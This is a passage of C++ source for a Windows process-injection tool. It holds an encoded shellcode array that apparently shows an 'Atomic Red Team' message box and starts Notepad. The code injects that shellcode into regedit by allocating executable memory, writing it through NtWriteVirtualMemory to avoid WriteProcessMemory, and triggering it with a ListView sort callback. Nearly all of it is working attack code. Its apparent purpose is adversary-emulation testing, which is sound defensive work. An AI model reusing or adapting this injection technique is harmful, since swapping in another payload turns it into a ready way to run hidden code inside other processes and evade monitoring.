        0x01,0x00,0x00,0x48,0xb8,0x69,0x00,0x6f,0x00,0x6e,
        0x00,0x46,0x00,0x48,0x89,0x85,0xb0,0x01,0x00,0x00,
        0x48,0xb8,0x72,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
        0x48,0x89,0x85,0xb8,0x01,0x00,0x00,0x48,0xb8,0x77,
        0x00,0x6f,0x00,0x72,0x00,0x6b,0x00,0x48,0x89,0x85,
        0xc0,0x01,0x00,0x00,0x48,0xb8,0x3b,0x00,0x20,0x00,
        0x5b,0x00,0x53,0x00,0x48,0x89,0x85,0xc8,0x01,0x00,
        0x00,0x48,0xb8,0x79,0x00,0x73,0x00,0x74,0x00,0x65,
        0x00,0x48,0x89,0x85,0xd0,0x01,0x00,0x00,0x48,0xb8,
        0x6d,0x00,0x2e,0x00,0x57,0x00,0x69,0x00,0x48,0x89,
        0x85,0xd8,0x01,0x00,0x00,0x48,0xb8,0x6e,0x00,0x64,
        0x00,0x6f,0x00,0x77,0x00,0x48,0x89,0x85,0xe0,0x01,
        0x00,0x00,0x48,0xb8,0x73,0x00,0x2e,0x00,0x4d,0x00,
        0x65,0x00,0x48,0x89,0x85,0xe8,0x01,0x00,0x00,0x48,
        0xb8,0x73,0x00,0x73,0x00,0x61,0x00,0x67,0x00,0x48,
        0x89,0x85,0xf0,0x01,0x00,0x00,0x48,0xb8,0x65,0x00,
        0x42,0x00,0x6f,0x00,0x78,0x00,0x48,0x89,0x85,0xf8,
        0x01,0x00,0x00,0x48,0xb8,0x5d,0x00,0x3a,0x00,0x3a,
        0x00,0x53,0x00,0x48,0x89,0x85,0x00,0x02,0x00,0x00,
        0x48,0xb8,0x68,0x00,0x6f,0x00,0x77,0x00,0x28,0x00,
        0x48,0x89,0x85,0x08,0x02,0x00,0x00,0x48,0xb8,0x27,
        0x00,0x41,0x00,0x74,0x00,0x6f,0x00,0x48,0x89,0x85,
        0x10,0x02,0x00,0x00,0x48,0xb8,0x6d,0x00,0x69,0x00,
        0x63,0x00,0x20,0x00,0x48,0x89,0x85,0x18,0x02,0x00,
        0x00,0x48,0xb8,0x52,0x00,0x65,0x00,0x64,0x00,0x20,
        0x00,0x48,0x89,0x85,0x20,0x02,0x00,0x00,0x48,0xb8,
        0x54,0x00,0x65,0x00,0x61,0x00,0x6d,0x00,0x48,0x89,
        0x85,0x28,0x02,0x00,0x00,0x48,0xb8,0x27,0x00,0x2c,
        0x00,0x20,0x00,0x27,0x00,0x48,0x89,0x85,0x30,0x02,
        0x00,0x00,0x48,0xb8,0x57,0x00,0x61,0x00,0x72,0x00,
        0x6e,0x00,0x48,0x89,0x85,0x38,0x02,0x00,0x00,0x48,
        0xb8,0x69,0x00,0x6e,0x00,0x67,0x00,0x27,0x00,0x48,
        0x89,0x85,0x40,0x02,0x00,0x00,0x48,0xb8,0x2c,0x00,
        0x20,0x00,0x27,0x00,0x4f,0x00,0x48,0x89,0x85,0x48,
        0x02,0x00,0x00,0x48,0xb8,0x4b,0x00,0x27,0x00,0x2c,
        0x00,0x20,0x00,0x48,0x89,0x85,0x50,0x02,0x00,0x00,
        0x48,0xb8,0x27,0x00,0x57,0x00,0x61,0x00,0x72,0x00,
        0x48,0x89,0x85,0x58,0x02,0x00,0x00,0x48,0xb8,0x6e,
        0x00,0x69,0x00,0x6e,0x00,0x67,0x00,0x48,0x89,0x85,
        0x60,0x02,0x00,0x00,0x48,0xb8,0x27,0x00,0x29,0x00,
        0x3b,0x00,0x20,0x00,0x48,0x89,0x85,0x68,0x02,0x00,
        0x00,0x48,0xb8,0x53,0x00,0x74,0x00,0x61,0x00,0x72,
        0x00,0x48,0x89,0x85,0x70,0x02,0x00,0x00,0x48,0xb8,
        0x74,0x00,0x2d,0x00,0x50,0x00,0x72,0x00,0x48,0x89,
        0x85,0x78,0x02,0x00,0x00,0x48,0xb8,0x6f,0x00,0x63,
        0x00,0x65,0x00,0x73,0x00,0x48,0x89,0x85,0x80,0x02,
        0x00,0x00,0x48,0xb8,0x73,0x00,0x20,0x00,0x27,0x00,
        0x6e,0x00,0x48,0x89,0x85,0x88,0x02,0x00,0x00,0x48,
        0xb8,0x6f,0x00,0x74,0x00,0x65,0x00,0x70,0x00,0x48,
        0x89,0x85,0x90,0x02,0x00,0x00,0x48,0xb8,0x61,0x00,
        0x64,0x00,0x2e,0x00,0x65,0x00,0x48,0x89,0x85,0x98,
        0x02,0x00,0x00,0x48,0xb8,0x78,0x00,0x65,0x00,0x27,
        0x00,0x22,0x00,0x48,0x89,0x85,0xa0,0x02,0x00,0x00,
        0x48,0x8d,0x95,0xe0,0x00,0x00,0x00,0x48,0x8d,0x8d,
        0xa8,0x03,0x00,0x00,0xff,0x95,0x90,0x03,0x00,0x00,
        0x48,0xc7,0x85,0xb8,0x03,0x00,0x00,0x00,0x00,0x00,
        0x00,0xc7,0x44,0x24,0x50,0x01,0x00,0x00,0x00,0x48,
        0xc7,0x44,0x24,0x48,0x00,0x00,0x00,0x00,0x48,0xc7,
        0x44,0x24,0x40,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,
        0x24,0x38,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,
        0x30,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x28,
        0x00,0x00,0x00,0x00,0x48,0x8d,0x85,0xa8,0x03,0x00,
        0x00,0x48,0x89,0x44,0x24,0x20,0x45,0x33,0xc9,0x45,
        0x33,0xc0,0x48,0x8d,0x95,0x98,0x03,0x00,0x00,0x48,
        0x8d,0x8d,0xb8,0x03,0x00,0x00,0xff,0x95,0x80,0x03,
        0x00,0x00,0x48,0x8d,0x85,0xc0,0x03,0x00,0x00,0x48,
        0x8b,0xf8,0x33,0xc0,0xb9,0x58,0x00,0x00,0x00,0xf3,
        0xaa,0x48,0xc7,0x85,0xc0,0x03,0x00,0x00,0x58,0x00,
        0x00,0x00,0xc7,0x85,0xc8,0x03,0x00,0x00,0x00,0x00,
        0x00,0x00,0xb8,0x08,0x00,0x00,0x00,0x48,0x6b,0xc0,
        0x01,0x41,0xb8,0x20,0x00,0x00,0x00,0xba,0x08,0x00,
        0x00,0x00,0x48,0x8b,0x4d,0x00,0x48,0x8b,0x4c,0x01,
        0x28,0xff,0x95,0x78,0x03,0x00,0x00,0x48,0x89,0x85,
        0x20,0x04,0x00,0x00,0x48,0x8b,0x85,0x20,0x04,0x00,
        0x00,0x48,0xc7,0x00,0x28,0x00,0x00,0x00,0xb8,0x20,
        0x00,0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,0x8b,0x8d,
        0x20,0x04,0x00,0x00,0xc7,0x44,0x01,0x08,0x05,0x00,
        0x02,0x00,0xb8,0x20,0x00,0x00,0x00,0x48,0x6b,0xc0,
        0x00,0x0f,0xb7,0x8d,0x98,0x03,0x00,0x00,0x48,0x8b,
        0x95,0x20,0x04,0x00,0x00,0x48,0x89,0x4c,0x02,0x10,
        0xb8,0x20,0x00,0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,
        0x8b,0x8d,0x20,0x04,0x00,0x00,0x48,0x8b,0x95,0xa0,
        0x03,0x00,0x00,0x48,0x89,0x54,0x01,0x18,0x48,0xc7,
        0x85,0x30,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x48,
        0x8b,0x85,0x20,0x04,0x00,0x00,0x48,0x89,0x44,0x24,
        0x50,0x48,0x8d,0x85,0xc0,0x03,0x00,0x00,0x48,0x89,
        0x44,0x24,0x48,0x48,0x8b,0x85,0xb8,0x03,0x00,0x00,
        0x48,0x89,0x44,0x24,0x40,0xc7,0x44,0x24,0x38,0x00,
        0x00,0x00,0x00,0xc7,0x44,0x24,0x30,0x00,0x00,0x00,
        0x00,0x48,0xc7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,
        0x48,0xc7,0x44,0x24,0x20,0x00,0x00,0x00,0x00,0x41,
        0xb9,0xff,0xff,0x1f,0x00,0x41,0xb8,0xff,0xff,0x1f,
        0x00,0x48,0x8d,0x95,0x30,0x04,0x00,0x00,0x48,0x8d,
        0x8d,0x28,0x04,0x00,0x00,0xff,0x95,0x88,0x03,0x00,
        0x00,0x89,0x85,0x38,0x04,0x00,0x00,0x48,0xb8,0x4e,
        0x74,0x53,0x75,0x73,0x70,0x65,0x6e,0x48,0x89,0x45,
        0x10,0x48,0xb8,0x64,0x54,0x68,0x72,0x65,0x61,0x64,
        0x00,0x48,0x89,0x45,0x18,0x48,0x8d,0x55,0x10,0x48,
        0x8b,0x8d,0x68,0x03,0x00,0x00,0xff,0x95,0x50,0x03,
        0x00,0x00,0x48,0x89,0x85,0x40,0x04,0x00,0x00,0x33,
        0xd2,0x48,0xc7,0xc1,0xfe,0xff,0xff,0xff,0xff,0x95,
        0x40,0x04,0x00,0x00,0x48,0x8d,0xa5,0x18,0x05,0x00,
        0x00,0x5f,0x5d,0xc3};

int main(int argc, char* argv[]) {
    std::cout << "[+] Starting the program." << std::endl;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Zeroing STARTUPINFO and PROCESS_INFORMATION structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create a process for the Windows Registry Editor
    if (!CreateProcess(L"C:\\Windows\\regedit.exe",   // the path
        NULL,           // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)            // Pointer to PROCESS_INFORMATION structure
        ) 
    {
        std::cerr << "[-] CreateProcess failed (" << GetLastError() << ").\n";
        return -1;
    }

    Sleep(2000);

    HANDLE ph;
    DWORD pid;
    LPVOID mem;
    EnumData data;

    // Find the "Registry Editor" window
    std::cout << "[+] Looking for the 'Registry Editor' window..." << std::endl;
    data.title = L"Registry Editor";
    data.hwnd = NULL;
    EnumWindows(EnumWindowsProc, (LPARAM)&data);
    HWND wpw = data.hwnd;
    if (!wpw) {
        std::cerr << "[-] Failed to find window. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Find the "SysListView32" child window
    std::cout << "[+] Looking for the 'SysListView32' window..." << std::endl;
    data.title = L"SysListView32";
    data.hwnd = NULL;
    EnumChildWindows(wpw, EnumChildProc, (LPARAM)&data);
    HWND hw = data.hwnd;
    if (!hw) {
        std::cerr << "[-] Failed to find list view. Error: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[+] Getting the process ID..." << std::endl;
    GetWindowThreadProcessId(hw, &pid);
    if (pid == 0) {
        std::cerr << "[-] Failed to get process ID. Error: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[+] Opening the process..." << std::endl;
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!ph) {
        std::cerr << "[-] Failed to open process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Allocate RWX memory
    std::cout << "[+] Allocating memory in the remote process..." << std::endl;
    mem = VirtualAllocEx(ph, NULL, sizeof(my_payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        std::cerr << "[-] Failed to allocate memory. Error: " << GetLastError() << std::endl;
        CloseHandle(ph);
        return 1;
    }

    // Get a handle to ntdll.dll where the function resides
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        std::cerr << "[-] Failed to get handle to ntdll.dll" << std::endl;
        return 1;
    }

    // Get the NtWriteVirtualMemory function address
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    if (!NtWriteVirtualMemory) {
        std::cerr << "[-] Failed to get address of NtWriteVirtualMemory" << std::endl;
        return 1;
    }

    // Use NtWriteVirtualMemory instead of WriteProcessMemory
    std::cout << "[+] Writing memory to the remote process..." << std::endl;
    NTSTATUS status = NtWriteVirtualMemory(ph, mem, my_payload, sizeof(my_payload), NULL);
    if (status != STATUS_SUCCESS) {
        std::cerr << "[-] NtWriteVirtualMemory failed. Status: " << std::hex << status << std::endl;
        VirtualFreeEx(ph, mem, 0, MEM_RELEASE);
        CloseHandle(ph);
        return 1;
    }


    if (!hw) {
        std::cerr << "[-] Failed to find list view. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Check if there is at least one item in the list
    // This is relevant in case of other remote process as target.
    int itemCount = ListView_GetItemCount(hw);
    if (itemCount <= 0) {
        std::cerr << "[-] List view is empty." << std::endl;
        // Handle the empty list case here, wait, retry, or exit?
        return 1;
    }

    // Trigger payload
    std::cout << "[+] Posting message to the target window..." << std::endl;
    if (!PostMessage(hw, LVM_SORTITEMS, 0, (LPARAM)mem)) {
        std::cerr << "[-] Failed to post message. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(ph, mem, 0, MEM_RELEASE);
        CloseHandle(ph);
        return 1;
    }

    Sleep(8000); // Wait for 5 seconds to allow the payload to execute

    // Attempt to terminate the process (Regedit)
    if (!TerminateProcess(pi.hProcess, 0)) {
        std::cerr << "[-] Failed to terminate process. Error: " << GetLastError() << std::endl;
        // handle error 25519
    } else {
        std::cout << "[+] RegEdit process termination successfull." << std::endl;
    }

    // Wait for the process to exit
    WaitForSingleObject(pi.hProcess, INFINITE);
    // Clean up
    VirtualFreeEx(ph, mem, 0, MEM_RELEASE);
    CloseHandle(ph);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::cout << "[+] Payload executed successfully." << std::endl;

    return 0;
}